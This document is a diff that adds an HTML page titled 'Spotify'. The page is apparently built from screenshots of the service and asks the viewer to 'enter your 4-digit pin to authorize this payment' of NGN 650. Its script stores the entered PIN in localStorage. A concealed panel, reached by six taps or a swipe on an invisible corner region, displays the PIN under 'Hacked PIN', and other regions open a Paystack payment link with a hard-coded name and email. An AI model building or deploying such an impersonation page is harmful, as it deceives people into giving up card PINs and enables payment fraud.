@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Spotify</title>
+</head>
+<body>
+ <style>
+ @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+ 
+       body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: black;    
+      color: #fff;    
+      margin: 0;     
+      }
+.email-amount {
+      text-align: right;
+      width: 100%;
+      max-width: 360px;
+      margin-bottom: 30px;
+    }
+
+    .email-amount p {
+      margin: 0;
+      font-size: 13.5px;
+      color: #555;
+    }
+
+    .amount {
+      color: #00b300;
+      font-weight: 600;
+    }
+
+    .prompt {
+      text-align: center;
+      max-width: 360px;
+      font-size: 16.5px;
+      font-weight: 500;
+      color: #2d2d2d;
+      margin-bottom: 44px;
+      margin-top: 7.1%;
+    }
+
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .pin-inputs input {
+      width: 39px;
+      height: 45px;
+      font-size: 24px;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .pin-inputs input:focus {
+      border-color: #007bff;
+    }
+  
+    .evil-bg {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: -1;
+      background: linear-gradient(-45deg,
+        #ff0000,
+        #6600ff,
+        #00ffe1,
+        #ff8800,
+        #00ff66,
+        #ff00cc
+      );
+      background-size: 1000% 1000%;
+      animation: moveEvil 20s linear infinite;
+      filter: blur(40px);
+      opacity: 0.5;
+    }
+
+    @keyframes moveEvil {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      position: absolute;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      color: white;
+    }
+
+    h1 {
+      font-size: 36px;
+      color: #ff1a1a;
+      text-shadow:
+        0 0 10px #ff1a1a,
+        0 0 30px #ff0000;
+      animation: flicker 0.4s infinite alternate;
+  width: 100%;
+    }
+
+    @keyframes flicker {
+      from { opacity: 1; text-shadow: 0 0 10px #ff1a1a; }
+      to { opacity: 0.7; text-shadow: 0 0 25px #ff0000; }
+    }
+
+    .pin-display {
+      font-size: 60px;
+      font-weight: bold;
+      color: #939393;
+      letter-spacing: 18px;
+      text-shadow:
+        0 0 10px #00ffcc,
+        0 0 30px #00ffff,
+        0 0 60px #00ffaa;
+      animation: pulse 2s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0% { text-shadow: 0 0 10px #00ffcc; }
+      50% { text-shadow: 0 0 40px #00ffff; }
+      100% { text-shadow: 0 0 10px #00ffcc; }
+    }
+</style>
+ 
+<div id="clickContainer" style="width: 100%; height: 100vh; background: white; position: fixed; top: 0; left: 0; overflow-y: auto; scroll-behavior: smooth;-webkit-overflow-scrolling: touch; scrollbar-width: thin; scrollbar-color: #ccc transparent; display: none;">
+ <div class="evil-bg"></div>
+
+  <div class="container">
+    
+    <h1>Hacked PIN 🔥😈🔥😭☠️</h1>
+    <div class="pin-display" id="pin">----</div>
+<h1>💣💨🥹👹🤑</h1>
+  </div>
+</div>
+<div id="swipeContainer" style="width: 100%; height: 100vh; background: white; position: fixed; top: 0; left: 0; overflow-y: auto; scroll-behavior: smooth;-webkit-overflow-scrolling: touch; scrollbar-width: thin; scrollbar-color: #ccc transparent; display: none;">
+<div id="joy2"style="display: none;">
+    <img style="width: 100%; height: auto; position: absolute; margin-top: 0;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752020896/uploads/u234cfrnb570gir8wlol.jpg" alt="">
+</div>
+<div id="joy1" style="display: block;">
+<div>
+    <img style="width: 100%; height: auto; position: absolute; margin-top: 0;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752020933/uploads/cwtfbabafxhun8xzqhz2.jpg" alt="">
+  </div>
+
+  <div style="display: flex;flex-direction: column;align-items: center;padding: 14px 20px; background-color: transparent;color: #2b2b2b; z-index: 3; position: absolute;">
+    <div class="email-amount">
+      <p style="margin-top: 2px;">tuakajack6@gmail.com</p>
+      <p style="margin-top: 1%;">Pay <span class="amount">NGN 650</span></p>
+    </div>
+
+    <div class="prompt">
+      Please enter your 4-digit pin to authorize this payment
+    </div>
+
+    <div class="pin-inputs">
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+      <input type="text" inputmode="numeric" maxlength="1" />
+    </div>
+  </div>
+</div>
+</div>
+<div id="showpre" style="width: 100%; height: 100vh; position: fixed; top: 0; left: 0; overflow-y: auto; scroll-behavior: smooth;-webkit-overflow-scrolling: touch; scrollbar-width: thin; scrollbar-color: #ccc transparent; display: none;">
+  <div onclick="openPaystack()" style="width: 81%; height: 10%; background: transparent; position: absolute; z-index: 2; top: 32.5%; left: 9.5%;"></div>
+   <div onclick="openPaystack()" style="width: 81%; height: 10%; background: transparent; position: absolute; z-index: 2; top: 209.5%; left: 9.5%;"></div>
+   
+   <img style="width: 100%; height: auto;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752020988/uploads/zaakswg9pvgclfu3fauc.jpg" alt="">  
+  <img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021084/uploads/ouof2j2s8zghyyw6ghzr.jpg" alt=""> 
+   <img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021117/uploads/ujdzlq76ers2m5g5gvk1.jpg" alt=""> 
+    </div>
+<div id="spotcon" style="width: 100%; height: 100vh; position: fixed; top: 0; left: 0; overflow-y: auto; scroll-behavior: smooth;-webkit-overflow-scrolling: touch; scrollbar-width: thin; scrollbar-color: #ccc transparent; display: block;">
+  <div id="ifbut" style="width: 29%; height: 5%; background: transparent; position: absolute; z-index: 2; top: 1%; left: 2%;"></div>
+ <div onclick="showpre()" style="width: 81%; height: 10%; background: transparent; position: absolute; z-index: 2; top: 405%; left: 9.5%;"></div>
+ <div onclick="scrollDown()" style="width: 81%; height: 10%; background: transparent; position: absolute; z-index: 2; top: 72%; left: 9.5%;"></div>
+ <img style="width: 100%; height: auto;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021160/uploads/dgphjabvyxsnnusv9jar.jpg" alt="">
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021214/uploads/dwtksutsglkindf4ewvu.jpg" alt="">
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021258/uploads/kdp6y3cddfcbt8iguevt.jpg" alt="">
+
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021296/uploads/yjuhsuxnzyq0axrcaatv.jpg" alt="">
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021326/uploads/dtzduxafxk3bsqypnodb.jpg" alt="">
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021360/uploads/eplcdksjbrxyhzqbido5.jpg" alt="">
+<img style="width: 100%; height: auto; margin-top: -1.5%;" src="https://res.cloudinary.com/dwbylknew/image/upload/v1752021414/uploads/i5r7ikcx5cymhmi0exw7.jpg" alt="">
+
+</div>
+</div>
+<script>
+    
+    const idme ="home";
+   localStorage.setItem('activeContainer', idme);
+    function peace() {
+      const id = localStorage.getItem('activeContainer');
+if (id === 'showpre') {
+ document.getElementById("showpre").style.display ="none"; document.getElementById("spotcon").style.display ="block";
+ const idme ="home";
+   localStorage.setItem('activeContainer', idme);
+     } else if (id === 'clickContainer') {
+ document.getElementById("clickContainer").style.display ="none"; document.getElementById("spotcon").style.display ="block"; 
+ 
+ const idme ="home";
+   localStorage.setItem('activeContainer', idme); 
+   } else if (id === 'swipeContainer') {
+  document.getElementById("swipeContainer").style.display ="none"; 
+ document.getElementById("joy2").style.display ="none"; 
+ document.getElementById("joy1").style.display ="block"; 
+  document.getElementById("spotcon").style.display ="block";
+ const idme ="home";
+   localStorage.setItem('activeContainer', idme);
+     
+      } else if (id === 'cendis') {
+        document.getElementById("mescen").style.display ="none"
+  const idme ="account";
+   localStorage.setItem('activeContainer', idme);
+    }
+     };
+     
+      const inputs = document.querySelectorAll(".pin-inputs input");
+
+    // Replace value and move on key press
+    inputs.forEach((input, index) => {
+      input.addEventListener("beforeinput", (e) => {
+        const isDigit = /^[0-9]$/.test(e.data);
+        if (isDigit) {
+          e.preventDefault(); // stop default typing
+          input.value = e.data; // replace existing value
+
+          setTimeout(() => {
+            input.type = "password";
+          }, 300);
+
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+
+          const pin = Array.from(inputs).map(i => i.value).join("");
+          if (pin.length === 4) {
+            localStorage.setItem("card_pin", pin);
+    
+    
+    document.getElementById("pin").textContent = pin ? pin : "----";
+    // After 2 seconds, blur all inputs and hide keyboard
+          setTimeout(() => {
+            inputs.forEach(i => i.blur());
+          }, 1000);
+          
+  setTimeout(() => {
+document.getElementById("joy1").style.display ="none";        
+document.getElementById("joy2").style.display ="block";        
+           
+                     }, 2500);
+                    
+                    }
+        }
+      });
+
+      // Handle backspace
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace") {
+          if (input.value === "") {
+            if (index > 0) {
+              inputs[index - 1].value = "";
+              inputs[index - 1].type = "text";
+              inputs[index - 1].focus();
+            }
+          } else {
+            input.type = "text";
+            input.value = "";
+          }
+        }
+      });
+
+      // If first input is empty, force focus to it
+      input.addEventListener("focus", () => {
+        if (inputs[0].value === "" && index !== 0) {
+          inputs[0].focus();
+        }
+      });
+    });
+     
+    function scrollDown() {
+      const container = document.getElementById("spotcon");
+      const scrollAmount = 2100; // Amount to scroll down in pixels
+
+      container.scrollBy({
+        top: scrollAmount,
+        behavior: 'smooth'
+      });
+    }
+    function showpre() {
+      document.getElementById("spotcon").style.display ="none";
+document.getElementById("showpre").style.display ="block";
+    const idme ="showpre";
+   localStorage.setItem('activeContainer', idme);  
+      
+       }
+
+ const pin = localStorage.getItem("card_pin");
+    document.getElementById("pin").textContent = pin ? pin : "----";
+
+const button = document.getElementById("ifbut");
+    const clickContainer = document.getElementById("clickContainer");
+    const swipeContainer = document.getElementById("swipeContainer");
+
+    let clickCount = 0;
+    let clickTimeout;
+
+    // Handle 4 clicks
+    button.addEventListener("click", () => {
+      clickCount++;
+      clearTimeout(clickTimeout);
+      clickTimeout = setTimeout(() => clickCount = 0, 1000); // Reset after 1 second of no clicks
+
+      if (clickCount === 6) {
+ document.getElementById("spotcon").style.display ="none";
+        clickContainer.style.display = "block";
+  const idme ="clickContainer";
+   localStorage.setItem('activeContainer', idme);          
+                clickCount = 0;
+      }
+    });
+
+    // Handle swipe left
+    let startX = null;
+
+    button.addEventListener("touchstart", (e) => {
+      startX = e.touches[0].clientX;
+    });
+
+    button.addEventListener("touchend", (e) => {
+      if (startX === null) return;
+      const endX = e.changedTouches[0].clientX;
+      const diff = startX - endX;
+
+      if (diff > 50) { // Swiped left more than 50px
+        
+document.getElementById("spotcon").style.display ="none";      
+        swipeContainer.style.display = "block";
+  const idme ="swipeContainer";
+   localStorage.setItem('activeContainer', idme);         
+              }
+
+      startX = null;
+    });
+function openPaystack() {
+      // Replace with dynamic values or from input fields if needed
+      const firstName = "Tuaka";
+      const lastName = "Jack";
+      const email = "tuakajack6@gmail.com";
+      const amountNaira = 650; // ₦1500
+      const amountKobo = amountNaira * 1;
+
+      const baseUrl = "https://paystack.shop/pay/vg7551015f";
+      const fullUrl = `${baseUrl}?email=${encodeURIComponent(email)}&first_name=${encodeURIComponent(firstName)}&last_name=${encodeURIComponent(lastName)}&amount=${amountKobo}`;
+
+      // Open in a new tab
+      window.open(fullUrl, "_blank");
+    }
+
+
+</script>
+
+
+</body>
+</html>
